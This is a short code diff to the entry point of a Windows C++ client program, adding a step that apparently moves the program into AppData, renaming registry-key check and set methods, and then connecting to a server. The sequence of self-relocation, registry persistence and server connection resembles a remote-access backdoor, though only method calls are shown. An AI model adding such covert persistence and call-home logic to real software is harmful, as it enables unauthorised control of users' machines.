@@ -13,9 +13,14 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int n
 
 	CLIENT client;
 
-	if (!client.CheckRegKey())
+	if (!client.is_in_ad()) 
 	{
-		client.SetRegKey();
+		client.move_to_ad();
+	}
+
+	if (!client.check_reg_key())
+	{
+		client.set_reg_key();
 	}
 
 	client.connect_to_server();
